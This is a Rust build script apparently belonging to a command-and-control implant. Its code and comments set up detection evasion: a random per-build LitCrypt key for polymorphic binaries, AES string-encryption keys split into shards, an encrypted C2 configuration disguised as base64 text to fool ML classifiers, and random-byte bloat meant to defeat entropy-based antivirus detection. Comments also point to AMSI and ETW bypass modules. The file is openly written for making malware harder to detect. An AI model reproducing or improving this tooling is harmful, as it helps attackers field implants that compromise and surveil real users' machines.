// ./build.rs
use std::env;
use std::fs::{self, File};
use std::io::{BufWriter, Write};
use std::path::Path;
use rand::{Rng, RngCore, thread_rng};
use rand::distributions::Alphanumeric;

fn main() {
    let out_dir = env::var("OUT_DIR").unwrap();

    // ── 0. Force rebuild on every invocation ──────────────────────────
    //
    // Emitting no `cargo:rerun-if-changed` directives causes cargo to
    // re-run build.rs on EVERY build - the documented default behaviour.
    //
    // DO NOT add `cargo:rerun-if-changed=build.rs` here. That directive
    // means "re-run only when build.rs itself changes", which is the
    // opposite of what we want. The previous comment was wrong about this.
    //
    // The cert directory and C2_BUILD_CONFIG env var are registered below
    // with their own targeted directives so cargo can still skip cert
    // regeneration and config embedding when nothing has changed. The
    // litcrypt key section, however, must be fresh every time so that
    // sequential builds produce binaries with different signatures even
    // from identical source.

    let mut rng = thread_rng();

    // ── 1. POLYMORPHISM: Random LitCrypt Key ──────────────────────────
    //
    // The key is 64 bytes drawn from the full printable-ASCII range
    // (0x21-0x7E) rather than just alphanumerics. This expands the
    // keyspace from 62^64 ≈ 2^381 to 94^64 ≈ 2^420 and avoids the
    // alphanumeric bias that makes brute-force enumeration marginally
    // cheaper.
    //
    // NOTE: lc!() only obfuscates strings explicitly wrapped with the
    // macro. High-value WinAPI strings in the evasion modules
    // (amsi.dll, AmsiScanBuffer, ntdll.dll, EtwEventWrite, etc.) must
    // be wrapped individually - build.rs cannot do that automatically.
    // See the coverage audit in docs/evasion.md.
    let litcrypt_key: String = (0..64)
        .map(|_| rng.gen_range(0x21u8..=0x7Eu8) as char)
        .collect();
    println!("cargo:rustc-env=LITCRYPT_ENCRYPT_KEY={}", litcrypt_key);

    // The same per-build entropy also feeds the AES string cryptor. The
    // 64-byte key is split into four 16-byte shards, each emitted as a
    // separate env var and consumed at a different code site, so no single
    // contiguous key image appears in the binary. The runtime reassembles
    // them; the proc-macro derives a fresh per-string key from them at
    // compile time (see strcrypt).
    {
        fn hex_of(bytes: &[u8]) -> String {
            bytes.iter().map(|b| format!("{:02x}", b)).collect()
        }
        for (i, chunk) in litcrypt_key.as_bytes().chunks(16).enumerate() {
            println!("cargo:rustc-env=RCM_STRCRYPT_S{}={}", i + 1, hex_of(chunk));
        }
    }

    // ── 2. PLACEHOLDER CERTS ──────────────────────────────────────────
    println!("cargo:rerun-if-changed=certs/");
    let cert_dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("certs");
    fs::create_dir_all(&cert_dir).expect("Failed to create certs/");
    for name in &["ca.crt", "client.crt", "client.key.der", "server.crt", "server.key.der"] {
        let p = cert_dir.join(name);
        if !p.exists() {
            fs::write(&p, b"").expect(&format!("Failed to write placeholder {}", name));
            println!("cargo:warning=certs/{} is a placeholder — run ./gen_certs.sh before production builds", name);
        }
    }

    // ── 4. CONFIGURATION EMBEDDING ───────────────────────────────────
    println!("cargo:rerun-if-env-changed=C2_BUILD_CONFIG");
    let env_val = env::var("C2_BUILD_CONFIG").unwrap_or_default();

    let config_data = if env_val.is_empty() {
        serde_json::json!({ "bloat_mb": 0 })
    } else {
        serde_json::from_str(&env_val).expect("Invalid JSON in C2_BUILD_CONFIG")
    };

    let bloat_mb = config_data["bloat_mb"].as_u64().unwrap_or(0) as usize;

    let config_dest_path = Path::new(&out_dir).join("obfuscated_config.rs");
    let mut conf_code = String::new();

    if let (Some(key), Some(nonce), Some(cipher)) = (
        config_data["key_hex"].as_str(),
        config_data["nonce_hex"].as_str(),
        config_data["cipher_hex"].as_str(),
    ) {
        let key_bytes    = hex::decode(key).expect("Invalid Key Hex");
        let nonce_bytes  = hex::decode(nonce).expect("Invalid Nonce Hex");
        let cipher_bytes = hex::decode(cipher).expect("Invalid Cipher Hex");

        // Text-shaped carrier: emit the ciphertext as chunked base64 (a
        // concat! of short string literals, like a manifest block) so the
        // compiled PE holds plausible ASCII text. A raw byte array would
        // land in .rodata as one high-entropy blob, which ML classifiers
        // read as "packed". Decoded at agent startup inside get_config();
        // the crypto itself is unchanged. The base64 alphabet contains no
        // quotes/backslashes, so the literals need no escaping.
        use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
        let cipher_b64 = BASE64.encode(&cipher_bytes);

        conf_code.push_str("use aes_gcm::{Aes256Gcm, KeyInit, aead::Aead};\n");
        conf_code.push_str(&format!("const CONFIG_KEY: [u8; 32] = {:?};\n", key_bytes));
        conf_code.push_str(&format!("const CONFIG_NONCE: [u8; 12] = {:?};\n", nonce_bytes));
        conf_code.push_str("const CONFIG_CIPHER_B64: &str = concat!(\n");
        let mut rest = cipher_b64.as_str();
        while !rest.is_empty() {
            let take = rest.len().min(100);
            let (line, tail) = rest.split_at(take);
            conf_code.push_str(&format!("    \"{}\",\n", line));
            rest = tail;
        }
        conf_code.push_str(");\n");
        // get_config() returns the raw decrypted bytes: the plaintext is a
        // packed binary C2Config (see common.rs), not UTF-8 JSON.
        conf_code.push_str("pub fn get_config() -> Vec<u8> {\n");
        conf_code.push_str("    use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};\n");
        conf_code.push_str("    let cipher_bytes = match BASE64.decode(CONFIG_CIPHER_B64) {\n");
        conf_code.push_str("        Ok(c) => c,\n");
        conf_code.push_str("        Err(_) => std::process::exit(1),\n");
        conf_code.push_str("    };\n");
        conf_code.push_str("    let key = aes_gcm::Key::<Aes256Gcm>::from_slice(&CONFIG_KEY);\n");
        conf_code.push_str("    let cipher = Aes256Gcm::new(key);\n");
        conf_code.push_str("    let nonce = aes_gcm::Nonce::from_slice(&CONFIG_NONCE);\n");
        conf_code.push_str("    match cipher.decrypt(nonce, cipher_bytes.as_slice()) {\n");
        conf_code.push_str("        Ok(p) => p,\n");
        conf_code.push_str("        Err(_) => std::process::exit(1),\n");
        conf_code.push_str("    }\n");
        conf_code.push_str("}\n");
    } else {
        conf_code.push_str("pub fn get_config() -> Vec<u8> { Vec::new() }\n");
    }
    fs::write(&config_dest_path, conf_code).expect("Failed to write config artifact");

    // ── 5. BLOAT ─────────────────────────────────────────────────────
    //
    // Previous implementation wrote null bytes ([0u8; 1024]), which
    // produces a distinctive zeroed region in .rodata that AV engines
    // recognise as artificial padding. Replaced with cryptographically
    // random bytes that have no identifiable structure.
    //
    // Stored as &[u8] rather than &str because arbitrary random bytes
    // are not valid UTF-8. The volatile read in use_bloat() forces the
    // linker to keep the section; the random content defeats simple
    // entropy-based detection by blending with encrypted data sections.
    let bloat_rs_path = Path::new(&out_dir).join("bloat_data.rs");
    let mut rs_code = String::new();

    if bloat_mb > 0 {
        let bloat_bin_path = Path::new(&out_dir).join("bloat.bin");
        let target_bytes   = bloat_mb * 1024 * 1024;
        let file           = File::create(&bloat_bin_path).unwrap();
        let mut writer     = BufWriter::new(file);
        let mut chunk      = [0u8; 4096];
        let mut written    = 0usize;
        while written < target_bytes {
            rng.fill_bytes(&mut chunk);
            let remaining = target_bytes - written;
            let to_write  = remaining.min(chunk.len());
            writer.write_all(&chunk[..to_write]).unwrap();
            written += to_write;
        }
        writer.flush().unwrap();

        rs_code.push_str("pub static BENIGN_DATA: &[u8] = include_bytes!(concat!(env!(\"OUT_DIR\"), \"/bloat.bin\"));\n");
        rs_code.push_str("pub fn use_bloat() { if !BENIGN_DATA.is_empty() { unsafe { std::ptr::read_volatile(&BENIGN_DATA[0]); } } }\n");
    } else {
        rs_code.push_str("pub fn use_bloat() {}\n");
    }
    fs::write(&bloat_rs_path, rs_code).unwrap();
}